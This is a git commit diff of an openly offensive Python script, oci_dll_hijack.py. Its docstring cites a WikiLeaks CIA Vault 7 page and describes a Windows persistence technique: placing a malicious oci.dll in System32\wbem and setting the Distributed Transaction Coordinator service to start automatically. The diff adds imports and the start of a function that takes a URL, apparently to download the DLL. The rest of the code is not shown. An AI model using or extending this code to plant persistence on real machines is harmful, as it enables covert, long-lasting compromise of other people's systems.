034fb4e454e59d3c7d0347c37586fbbb483bb42a
rootm0s <rickardmalmkvist@hotmail.com>
2018-04-08 20:53:42 +0200

    Update oci_dll_hijack.py

--- oci_dll_hijack.py
+++ oci_dll_hijack.py
@@ -1,15 +1,18 @@
-def oci_dll_hijack(url,rename_dll):
-	"""
-	https://wikileaks.org/ciav7p1/cms/page_2621767.html
+"""
+https://wikileaks.org/ciav7p1/cms/page_2621767.html
 	
-	Windows contains a service called "Distributed Transaction Coordinator" that is
-	configured to "Manual" start by default. This service causes a DLL called
-	"C:\Windows\System32\wbem\oci.dll" to load into the "Network Services" group.
-	By placing our own DLL in this location and configuring the service to start
-	automatially, we have a persistence mechanism with system privileges. The service
-	runs under the "Network Service" account, which is a restricted account that has
-	privileges to access the network.
-	"""
+Windows contains a service called "Distributed Transaction Coordinator" that is
+configured to "Manual" start by default. This service causes a DLL called
+"C:\Windows\System32\wbem\oci.dll" to load into the "Network Services" group.
+By placing our own DLL in this location and configuring the service to start
+automatially, we have a persistence mechanism with system privileges. The service
+runs under the "Network Service" account, which is a restricted account that has
+privileges to access the network.
+"""
+import os
+import requests
+
+def oci_dll_hijack(url,rename_dll):
 	dll = "oci.dll"
 	dll_path = "C:\Windows\System32\wbem"
 	
